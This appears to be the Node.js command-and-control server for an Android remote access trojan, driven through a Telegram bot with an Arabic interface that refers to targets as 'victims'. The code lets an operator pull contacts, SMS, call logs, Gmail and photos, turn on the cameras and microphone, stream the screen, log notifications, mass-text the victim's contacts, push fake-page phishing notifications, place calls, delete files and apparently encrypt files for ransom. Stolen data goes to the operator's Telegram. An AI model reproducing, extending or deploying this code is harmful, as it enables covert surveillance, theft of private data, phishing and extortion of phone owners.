const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const telegramBot = require("node-telegram-bot-api");
const multer = require("multer");
const fs = require("fs");
const path = require("path");

/* ============ الإعدادات الأساسية ============ */
const app = express();
const server = http.createServer(app);
const io = new Server(server, { maxHttpBufferSize: 1e8 }); // 100MB للبث
const uploader = multer();

const data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
const bot = new telegramBot(data.token, { polling: true });

const appData = new Map();

/* ============ الأوامر ============ */
const actions = [
  "📒 سحب جهات اتصال 📒",
  "💬 سحب الرسائل 💬",
  "📞 سجل المكالمات 📞",
  "📽 التطبيقات 📽",
  "📸 كيمرا خلفيه 📸",
  "📸 كيمرا أمامية 📸",
  "🎙 تسجيل صوت 🎙",
  "📋 سجل الحافظه 📋",
  "📺 لقطة شاشة 📺",
  "😎 اضهار رساله اسفل الشاشة 😎",
  "💬 ارسال رساله 💬",
  "📳 اهتزاز 📳",
  "▶ تشغيل الصوت ▶",
  "🛑 ايقاف الصوت 🛑",
  "🦝 اضهار اشعارات الضحية 🦝",
  "🛑 ايقاف الاشعارات 🛑",
  "📂 عرض جميع الملفات 📂",
  "🎬 سحب جميع الصور 🎬",
  "📡 بث مباشر للشاشة 📡",
  "🛑 ايقاف البث المباشر 🛑",
  "💬 ارسال رساله لجميع ارقام الضحيه 💬",
  "‼ اشعار صفحة مزورة ‼",
  "📧 سحب رسايل جيميل 📧",
  "⚠️ تشفير ملفات ⚠️",
  "☎️اتصال من هاتف الضحيه☎️",
  "✯ العودة إلى القائمة الرئيسية ✯"
];

/* ============ لوحة المفاتيح الموحدة ============ */
const mainKeyboard = {
  keyboard: [
    ["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"],
    ["✯ معلومات عن المطور ✯"]
  ],
  resize_keyboard: true
};

const controlKeyboard = {
  keyboard: [
    ["📒 سحب جهات اتصال 📒", "💬 سحب الرسائل 💬"],
    ["📞 سجل المكالمات 📞", "📽 التطبيقات 📽"],
    ["📸 كيمرا خلفيه 📸", "📸 كيمرا أمامية 📸"],
    ["🎙 تسجيل صوت 🎙", "📋 سجل الحافظه 📋"],
    ["📺 لقطة شاشة 📺", "😎 اضهار رساله اسفل الشاشة 😎"],
    ["💬 ارسال رساله 💬", "📳 اهتزاز 📳"],
    ["▶ تشغيل الصوت ▶", "🛑 ايقاف الصوت 🛑"],
    ["🦝 اضهار اشعارات الضحية 🦝", "🛑 ايقاف الاشعارات 🛑"],
    ["📂 عرض جميع الملفات 📂", "🎬 سحب جميع الصور 🎬"],
    ["📡 بث مباشر للشاشة 📡", "🛑 ايقاف البث المباشر 🛑"],
    ["💬 ارسال رساله لجميع ارقام الضحيه 💬"],
    ["‼ اشعار صفحة مزورة ‼", "📧 سحب رسايل جيميل 📧"],
    ["⚠️ تشفير ملفات ⚠️", "☎️اتصال من هاتف الضحيه☎️"],
    ["✯ العودة إلى القائمة الرئيسية ✯"]
  ],
  resize_keyboard: true,
  one_time_keyboard: true
};

const cancelKeyboard = {
  keyboard: [["✯ التراجع عن الاجراء ✯"]],
  resize_keyboard: true,
  one_time_keyboard: true
};

const successKeyboard = {
  keyboard: [
    ["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"],
    ["✯ معلومات عن المطور ✯"]
  ],
  resize_keyboard: true
};

/* ============ الدوال المساعدة ============ */
function sendSuccess(chatId, msg = "✯ تم تنفيذ الطلب بنجاح، سوف تتلقى الملف قريباً...") {
  bot.sendMessage(chatId,
    `<b>${msg}\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n`, {
    parse_mode: "HTML",
    reply_markup: successKeyboard
  });
}

function sendError(chatId, msg) {
  bot.sendMessage(chatId, `<b>✯ خطأ: ${msg}</b>`, { parse_mode: "HTML" });
}

/* ============ HTTP Routes ============ */
app.get("/", (_req, res) => {
  res.send("تم رفع الخادم مع تحيات المطور الملك صقر");
});

app.post("/upload", uploader.single("file"), (req, res) => {
  if (!req.file) return res.status(400).send("No file");
  const originalName = req.file.originalname;
  const model = req.headers.model || "Unknown Device";

  bot.sendDocument(data.id, req.file.buffer, {
    caption: `<b>✯ تم تحميل ملف من هاتف الضحية → ${model}</b>`,
    parse_mode: "HTML"
  }, {
    filename: originalName,
    contentType: "*/*"
  }).catch(err => console.error("Upload error:", err.message));

  res.send("Done");
});

/* ============ Socket.IO ============ */
io.on("connection", (socket) => {
  const model = (socket.handshake.headers.model || "Unknown") +
                "-" + socket.id.substring(0, 6);
  const version = socket.handshake.headers.version || "no information";
  const ip = socket.handshake.headers.ip ||
             socket.handshake.address || "no information";

  socket.model = model;
  socket.version = version;
  socket.ip = ip;

  // إشعار الاتصال
  const connectMsg =
    `<b>✯ جهاز الضحية متصل</b>\n\n` +
    `<b>اسم الهاتف</b> → ${model}\n` +
    `<b>إصدار الهاتف</b> → ${version}\n` +
    `<b>𝚒𝚙</b> → ${ip}\n` +
    `<b>الوقت</b> → ${socket.handshake.time || new Date().toISOString()}\n\n`;

  bot.sendMessage(data.id, connectMsg, { parse_mode: "HTML" })
     .catch(err => console.error("Connect msg error:", err.message));

  /* ---------- قطع الاتصال ---------- */
  socket.on("disconnect", () => {
    const disconnectMsg =
      `<b>✯ الجهاز غير متصل</b>\n\n` +
      `<b>اسم الهاتف</b> → ${model}\n` +
      `<b>إصدار الهاتف</b> → ${version}\n` +
      `<b>𝚒𝚙</b> → ${ip}\n` +
      `<b>الوقت</b> → ${new Date().toISOString()}\n\n`;

    bot.sendMessage(data.id, disconnectMsg, { parse_mode: "HTML" })
       .catch(err => console.error("Disconnect msg error:", err.message));

    // إيقاف البث إذا كان الجهاز هو الذي يبث
    if (appData.get("streamingTarget") === socket.id) {
      appData.delete("streamingTarget");
    }
  });

  /* ---------- مستكشف الملفات ---------- */
  socket.on("file-explorer", (files) => {
    try {
      let rows = [];
      let currentRow = [];

      files.forEach((file, index) => {
        const cbData = file.isFolder
          ? `${model}|cd-${file.name}`
          : `${model}|request-${file.name}`;

        currentRow.push({ text: file.name, callback_data: cbData });

        if (currentRow.length === 2 || index + 1 === files.length) {
          rows.push(currentRow);
          currentRow = [];
        }
      });

      rows.push([{ text: "✯ رجوع ✯", callback_data: `${model}|back-0` }]);

      bot.sendMessage(data.id,
        `<b>✯ تم عرض جميع الملفات لدى الضحية ${model}</b>`, {
        reply_markup: { inline_keyboard: rows },
        parse_mode: "HTML"
      });
    } catch (err) {
      console.error("File explorer error:", err.message);
    }
  });

  /* ---------- استقبال رسالة ---------- */
  socket.on("message", (msg) => {
    bot.sendMessage(data.id,
      `<b>✯ تم استلام رسالة من هاتف الضحية → ${model}\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → </b>${msg}`, {
      parse_mode: "HTML"
    }).catch(err => console.error("Message error:", err.message));
  });

  /* ---------- 📡 استقبال إطار من البث المباشر ---------- */
  socket.on("screen-frame", (frameData) => {
    try {
      // إرسال إطار واحد كل 3 ثوانٍ لتجنب Flood Telegram
      const now = Date.now();
      const lastSent = appData.get(`lastFrame_${socket.id}`) || 0;

      if (now - lastSent < 3000) return;
      appData.set(`lastFrame_${socket.id}`, now);

      if (!frameData || !frameData.image) return;

      const buffer = Buffer.from(frameData.image, "base64");

      bot.sendPhoto(data.id, buffer, {
        caption:
          `<b>📡 بث مباشر → ${model}\n` +
          `🕐 ${new Date().toLocaleTimeString("ar-DZ")}</b>`,
        parse_mode: "HTML"
      }).catch(err => console.error("Frame send error:", err.message));

    } catch (err) {
      console.error("Screen frame error:", err.message);
    }
  });

  /* ---------- إشعار انتهاء البث ---------- */
  socket.on("stream-stopped", () => {
    appData.delete(`lastFrame_${socket.id}`);
    appData.delete("streamingTarget");

    bot.sendMessage(data.id,
      `<b>🛑 تم إيقاف البث المباشر لجهاز → ${model}</b>`, {
      parse_mode: "HTML",
      reply_markup: successKeyboard
    }).catch(err => console.error("Stream stop msg error:", err.message));
  });
});

/* ============ Telegram Bot ============ */
bot.on("message", async (msg) => {
  try {
    const chatId = data.id;
    const text = msg.text;

    if (!text) return;

    /* ---------- /start ---------- */
    if (text === "/start") {
      return bot.sendMessage(chatId,
        `<b>✯ أهلاً وسهلاً في أقوى بوت تحكم بالضحايا - الإصدار 5</b>\n\n` +
        `بوت رات قوي وسهل الاستخدام. لا تحتاج إلا كمبيوتر للتحكم بأي هاتف أندرويد.\n` +
        `تم التطوير من قبل 🇩🇿 عبدو الشلفاوي\n` +
        `المطور لا يتحمل مسؤولية سوء الاستخدام\n\n` +
        `تواصل مع المطور: @fox_dXx`, {
        parse_mode: "HTML",
        reply_markup: mainKeyboard
      });
    }

    /* ============================================================
       📌 أولاً: فحص جميع حالات currentAction قبل أي شيء آخر
       ============================================================ */

    /* ---------- مدة المايكروفون ---------- */
    if (appData.get("currentAction") === "microphoneDuration") {
      const duration = text;
      const target = appData.get("currentTarget");

      if (!duration || isNaN(duration)) {
        return sendError(chatId, "يجب إدخال رقم صحيح للمدة");
      }

      io.to(target).emit("commend", {
        request: "microphone",
        extras: [{ key: "duration", value: duration }]
      });

      appData.delete("currentTarget");
      appData.delete("currentAction");
      return sendSuccess(chatId);
    }

    /* ---------- نص رسالة Toast ---------- */
    if (appData.get("currentAction") === "toastText") {
      const toastMsg = text;
      const target = appData.get("currentTarget");

      io.to(target).emit("commend", {
        request: "toast",
        extras: [{ key: "text", value: toastMsg }]
      });

      appData.delete("currentTarget");
      appData.delete("currentAction");
      return sendSuccess(chatId);
    }

    /* ---------- رقم الاتصال ---------- */
    if (appData.get("currentAction") === "makeCallNumber") {
      appData.set("currentNumber", text);
      appData.set("currentAction", "makeCallText");

      return bot.sendMessage(chatId,
        `<b>✯ الآن أرسل كلمة **موافق** لتأكيد إجراء المكالمة ${text}</b>\n\n`, {
        parse_mode: "HTML",
        reply_markup: cancelKeyboard
      });
    }

    /* ---------- تأكيد الاتصال ---------- */
    if (appData.get("currentAction") === "makeCallText") {
      const confirm = text;
      const number = appData.get("currentNumber");
      const target = appData.get("currentTarget");

      io.to(target).emit("commend", {
        request: "makeCall",
        extras: [
          { key: "number", value: number },
          { key: "text", value: confirm }
        ]
      });

      appData.delete("currentTarget");
      appData.delete("currentAction");
      appData.delete("currentNumber");
      return sendSuccess(chatId, "✯ تم تنفيذ طلب الاتصال بنجاح");
    }

    /* ---------- رقم SMS ---------- */
    if (appData.get("currentAction") === "smsNumber") {
      appData.set("currentNumber", text);
      appData.set("currentAction", "smsText");

      return bot.sendMessage(chatId,
        `<b>✯ اكتب الرسالة التي تريد إرسالها إلى ${text}</b>\n\n`, {
        parse_mode: "HTML",
        reply_markup: cancelKeyboard
      });
    }

    /* ---------- نص SMS ---------- */
    if (appData.get("currentAction") === "smsText") {
      const smsText = text;
      const number = appData.get("currentNumber");
      const target = appData.get("currentTarget");

      io.to(target).emit("commend", {
        request: "sendSms",
        extras: [
          { key: "number", value: number },
          { key: "text", value: smsText }
        ]
      });

      appData.delete("currentTarget");
      appData.delete("currentAction");
      appData.delete("currentNumber");
      return sendSuccess(chatId);
    }

    /* ---------- مدة الاهتزاز ---------- */
    if (appData.get("currentAction") === "vibrateDuration") {
      const duration = text;
      const target = appData.get("currentTarget");

      if (!duration || isNaN(duration)) {
        return sendError(chatId, "يجب إدخال رقم صحيح للمدة");
      }

      io.to(target).emit("commend", {
        request: "vibrate",
        extras: [{ key: "duration", value: duration }]
      });

      appData.delete("currentTarget");
      appData.delete("currentAction");
      return sendSuccess(chatId);
    }

    /* ---------- نص لجميع جهات الاتصال ---------- */
    if (appData.get("currentAction") === "textToAllContacts") {
      const allText = text;
      const target = appData.get("currentTarget");

      io.to(target).emit("commend", {
        request: "smsToAllContacts",
        extras: [{ key: "text", value: allText }]
      });

      appData.delete("currentTarget");
      appData.delete("currentAction");
      return sendSuccess(chatId);
    }

    /* ---------- نص إشعار الصفحة المزورة ---------- */
    if (appData.get("currentAction") === "notificationText") {
      appData.set("currentNotificationText", text);
      appData.set("currentAction", "notificationUrl");

      return bot.sendMessage(chatId,
        `<b>✯ الآن اكتب الرابط الذي تريده أن يظهر بعد الضغط على الإشعار</b>\n\n`, {
        parse_mode: "HTML",
        reply_markup: cancelKeyboard
      });
    }

    /* ---------- رابط إشعار الصفحة المزورة ---------- */
    if (appData.get("currentAction") === "notificationUrl") {
      const url = text;
      const notifText = appData.get("currentNotificationText");
      const target = appData.get("currentTarget");

      io.to(target).emit("commend", {
        request: "popNotification",
        extras: [
          { key: "text", value: notifText },
          { key: "url", value: url }
        ]
      });

      appData.delete("currentTarget");
      appData.delete("currentAction");
      appData.delete("currentNotificationText");
      return sendSuccess(chatId);
    }

    /* ============================================================
       📌 ثانياً: الأوامر العامة
       ============================================================ */

    /* ---------- عدد الأجهزة ---------- */
    if (text === "✯ عدد الاجهزه ✯") {
      if (io.sockets.sockets.size === 0) {
        return bot.sendMessage(chatId, "<b>✯ لا يوجد ضحية متصل</b>\n\n",
          { parse_mode: "HTML" });
      }

      let result = `<b>✯ عدد الأجهزة المخترقة: ${io.sockets.sockets.size}</b>\n\n`;
      let index = 1;

      io.sockets.sockets.forEach((sock) => {
        result +=
          `<b>العدد ${index}</b>\n` +
          `<b>اسم الهاتف</b> → ${sock.model}\n` +
          `<b>إصدار الهاتف</b> → ${sock.version}\n` +
          `<b>𝚒𝚙</b> → ${sock.ip}\n` +
          `<b>الوقت</b> → ${sock.handshake.time || "N/A"}\n\n`;
        index++;
      });

      return bot.sendMessage(chatId, result, { parse_mode: "HTML" });
    }

    /* ---------- قائمة التحكم ---------- */
    if (text === "✯ قائمة التحكم ✯") {
      if (io.sockets.sockets.size === 0) {
        return bot.sendMessage(chatId, "<b>✯ لا يوجد ضحية متصل</b>\n\n",
          { parse_mode: "HTML" });
      }

      const deviceList = [];
      io.sockets.sockets.forEach((sock) => {
        deviceList.push([sock.model]);
      });
      deviceList.push(["✯ العودة إلى القائمة الرئيسية ✯"]);

      return bot.sendMessage(chatId,
        "<b>✯ حدد الجهاز الذي تريد التحكم به</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: deviceList,
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }

    /* ---------- معلومات المطور ---------- */
    if (text === "✯ معلومات عن المطور ✯") {
      return bot.sendMessage(chatId,
        `<b>✯ نحن الجيش الشلفاوي السيبراني\n` +
        `نصنع برمجيات لاختبار الاختراق الأخلاقي\n\n` +
        `𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 → @fox_dXx\n` +
        `Telegram → https://t.me/sx2teamcrack</b>\n\n`, {
        parse_mode: "HTML"
      });
    }

    /* ---------- العودة للقائمة الرئيسية ---------- */
    if (text === "✯ العودة إلى القائمة الرئيسية ✯") {
      appData.delete("currentTarget");
      appData.delete("currentAction");
      appData.delete("streamingTarget");

      return bot.sendMessage(chatId, "<b>✯ القائمة الرئيسية</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: mainKeyboard
      });
    }

    /* ---------- التراجع ---------- */
    if (text === "✯ التراجع عن الاجراء ✯") {
      const targetId = appData.get("currentTarget");
      const target = targetId ? io.sockets.sockets.get(targetId) : null;
      const targetModel = target ? target.model : "غير معروف";

      appData.delete("currentAction");
      appData.delete("currentNumber");
      appData.delete("currentNotificationText");

      return bot.sendMessage(chatId,
        `<b>✯ حدد أي إجراء تريد بجهاز الضحية ${targetModel}</b>\n\n`, {
        parse_mode: "HTML",
        reply_markup: controlKeyboard
      });
    }

    /* ============================================================
       📌 ثالثاً: أوامر التحكم (actions)
       ============================================================ */

    if (actions.includes(text)) {
      const target = appData.get("currentTarget");

      if (!target) {
        return bot.sendMessage(chatId,
          "<b>✯ لم يتم تحديد جهاز، استخدم قائمة التحكم أولاً</b>", {
          parse_mode: "HTML"
        });
      }

      // ⚠️ تحقق أن الجهاز لا يزال متصلاً
      if (!io.sockets.sockets.has(target)) {
        appData.delete("currentTarget");
        return sendError(chatId, "الجهاز المستهدف غير متصل الآن");
      }

      /* ============ 📡 بدء البث المباشر ============ */
      if (text === "📡 بث مباشر للشاشة 📡") {
        io.to(target).emit("commend", {
          request: "startScreenStream",
          extras: []
        });

        appData.set("streamingTarget", target);

        return bot.sendMessage(chatId,
          `<b>📡 تم بدء البث المباشر لشاشة الضحية\n\n` +
          `سيتم إرسال اللقطات تلقائياً كل بضع ثوانٍ\n` +
          `لإيقاف البث اضغط: 🛑 ايقاف البث المباشر 🛑</b>\n\n`, {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [
              ["🛑 ايقاف البث المباشر 🛑"],
              ["✯ العودة إلى القائمة الرئيسية ✯"]
            ],
            resize_keyboard: true
          }
        });
      }

      /* ============ 🛑 إيقاف البث المباشر ============ */
      if (text === "🛑 ايقاف البث المباشر 🛑") {
        let streamTarget = appData.get("streamingTarget") || target;

        if (streamTarget && io.sockets.sockets.has(streamTarget)) {
          io.to(streamTarget).emit("commend", {
            request: "stopScreenStream",
            extras: []
          });
        }

        appData.delete("streamingTarget");
        appData.delete("currentTarget");
        appData.delete("lastFrameTime");

        return sendSuccess(chatId, "✯ تم إيقاف البث المباشر بنجاح");
      }

      /* ============ أوامر فورية (تُرسل مباشرة) ============ */
      const directCommands = {
        "📒 سحب جهات اتصال 📒": "contacts",
        "💬 سحب الرسائل 💬": "all-sms",
        "📞 سجل المكالمات 📞": "calls",
        "📽 التطبيقات 📽": "apps",
        "📸 كيمرا خلفيه 📸": "main-camera",
        "📸 كيمرا أمامية 📸": "selfie-camera",
        "📋 سجل الحافظه 📋": "clipboard",
        "📺 لقطة شاشة 📺": "screenshot",
        "🦝 اضهار اشعارات الضحية 🦝": "keylogger-on",
        "🛑 ايقاف الاشعارات 🛑": "keylogger-off",
        "📂 عرض جميع الملفات 📂": "ls",
        "🎬 سحب جميع الصور 🎬": "gallery",
        "📧 سحب رسايل جيميل 📧": "all-email",
        "🛑 ايقاف الصوت 🛑": "stopAudio"
      };

      if (directCommands[text]) {
        io.to(target).emit(
          text === "📂 عرض جميع الملفات 📂" ? "file-explorer" : "commend",
          {
            request: directCommands[text],
            extras: []
          }
        );
        appData.delete("currentTarget");
        return sendSuccess(chatId);
      }

      /* ============ أوامر تحتاج إدخالاً من المستخدم ============ */
      const inputActions = {
        "🎙 تسجيل صوت 🎙": {
          action: "microphoneDuration",
          prompt: "<b>✯ اكتب مدة التسجيل بالثواني</b>\n\n"
        },
        "😎 اضهار رساله اسفل الشاشة 😎": {
          action: "toastText",
          prompt: "<b>✯ اكتب الرسالة التي تريد إظهارها أسفل الشاشة</b>\n\n"
        },
        "💬 ارسال رساله 💬": {
          action: "smsNumber",
          prompt:
            "<b>✯ اكتب الرقم الذي تريد إرسال الرسالة إليه\n" +
            "إذا كان الضحية ليس من بلدك فاكتب الرقم مع رمز الدولة</b>\n\n"
        },
        "☎️اتصال من هاتف الضحيه☎️": {
          action: "makeCallNumber",
          prompt: "<b>✯ أرسل الرقم الذي تريد الاتصال به</b>\n\n"
        },
        "📳 اهتزاز 📳": {
          action: "vibrateDuration",
          prompt:
            "<b>✯ اكتب مدة الاهتزاز بالثواني</b>\n\n"
        },
        "💬 ارسال رساله لجميع ارقام الضحيه 💬": {
          action: "textToAllContacts",
          prompt:
            "<b>✯ اكتب الرسالة التي تريد إرسالها إلى جميع الأرقام</b>\n\n"
        },
        "‼ اشعار صفحة مزورة ‼": {
          action: "notificationText",
          prompt:
            "<b>✯ اكتب الرسالة التي تريدها أن تظهر في الإشعارات</b>\n\n"
        },
        "▶ تشغيل الصوت ▶": {
          action: "recordVoice",
          prompt: "<b>✯ سجّل أي صوت لتشغيله على هاتف الضحية</b>\n\n"
        },
        "⚠️ تشفير ملفات ⚠️": {
          action: "encryptFiles",
          prompt: "<b>✯ أرسل كود فك تشفير الملفات</b>\n\n"
        }
      };

      if (inputActions[text]) {
        const cfg = inputActions[text];
        appData.set("currentAction", cfg.action);

        return bot.sendMessage(chatId, cfg.prompt, {
          parse_mode: "HTML",
          reply_markup: cancelKeyboard
        });
      }

      return;
    }

    /* ============================================================
       📌 رابعاً: اختيار جهاز من القائمة
       ============================================================ */
    let deviceSelected = false;
    io.sockets.sockets.forEach((sock, sockId) => {
      if (text === sock.model) {
        deviceSelected = true;
        appData.set("currentTarget", sockId);

        bot.sendMessage(chatId,
          `<b>✯ حدد أي إجراء تريد بجهاز الضحية ${sock.model}</b>\n\n`, {
          parse_mode: "HTML",
          reply_markup: controlKeyboard
        });
      }
    });

    if (deviceSelected) return;

    /* ---------- أمر غير معروف ---------- */
    // يمكن تجاهله بصمت أو إرسال رسالة
    // bot.sendMessage(chatId, "<b>✯ أمر غير معروف</b>", { parse_mode: "HTML" });

  } catch (err) {
    console.error("Bot message error:", err.message);
    bot.sendMessage(data.id,
      `<b>✯ حدث خطأ: ${err.message}</b>`, { parse_mode: "HTML" }
    ).catch(() => {});
  }
});

/* ============ معالجة الصوت (Voice) ============ */
bot.on("voice", async (msg) => {
  try {
    if (appData.get("currentAction") !== "recordVoice") return;

    const fileId = msg.voice.file_id;
    const target = appData.get("currentTarget");

    if (!target || !io.sockets.sockets.has(target)) {
      appData.delete("currentAction");
      appData.delete("currentTarget");
      return sendError(data.id, "الجهاز المستهدف غير متصل");
    }

    const fileLink = await bot.getFileLink(fileId);

    io.to(target).emit("commend", {
      request: "playAudio",
      extras: [{ key: "url", value: fileLink }]
    });

    appData.delete("currentTarget");
    appData.delete("currentAction");
    sendSuccess(data.id);

  } catch (err) {
    console.error("Voice error:", err.message);
    sendError(data.id, "فشل معالجة الملف الصوتي");
  }
});

/* ============ معالجة الأزرار المضمنة (Callback) ============ */
bot.on("callback_query", async (query) => {
  try {
    const cbData = query.data;
    if (!cbData || !cbData.includes("|")) return;

    const model = cbData.split("|")[0];
    const rest = cbData.split("|")[1];
    const command = rest.split("-")[0];
    const value = rest.split("-").slice(1).join("-");

    // البحث عن الجهاز المطابق
    let targetSocketId = null;
    io.sockets.sockets.forEach((sock, sockId) => {
      if (sock.model === model) targetSocketId = sockId;
    });

    if (!targetSocketId) {
      return bot.answerCallbackQuery(query.id, {
        text: "❌ الجهاز غير متصل حالياً",
        show_alert: true
      }).catch(() => {});
    }

    if (command === "back") {
      io.to(targetSocketId).emit("file-explorer", {
        request: "back",
        extras: []
      });
    } else if (command === "cd") {
      io.to(targetSocketId).emit("file-explorer", {
        request: "cd",
        extras: [{ key: "name", value }]
      });
    } else if (command === "upload") {
      io.to(targetSocketId).emit("file-explorer", {
        request: "upload",
        extras: [{ key: "name", value }]
      });
    } else if (command === "delete") {
      io.to(targetSocketId).emit("file-explorer", {
        request: "delete",
        extras: [{ key: "name", value }]
      });
    } else if (command === "request") {
      bot.editMessageText(`✯ حدد أي إجراء تريد: ${value}`, {
        chat_id: data.id,
        message_id: query.message.message_id,
        reply_markup: {
          inline_keyboard: [[
            {
              text: "✯ تحميل ملف ✯",
              callback_data: `${model}|upload-${value}`
            },
            {
              text: "✯ حذف الملف ✯",
              callback_data: `${model}|delete-${value}`
            }
          ]]
        },
        parse_mode: "HTML"
      }).catch(() => {});
    }

    bot.answerCallbackQuery(query.id).catch(() => {});

  } catch (err) {
    console.error("Callback query error:", err.message);
  }
});

/* ============ Ping Keep-Alive ============ */
setInterval(() => {
  io.sockets.sockets.forEach((sock, sockId) => {
    io.to(sockId).emit("ping", {});
  });
}, 5000);

/* ============ معالجة الأخطاء العامة ============ */
process.on("uncaughtException", (err) => {
  console.error("Uncaught Exception:", err.message);
});

process.on("unhandledRejection", (reason) => {
  console.error("Unhandled Rejection:", reason);
});

/* ============ تشغيل السيرفر ============ */
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`✅ Server listening on port ${PORT}`);
});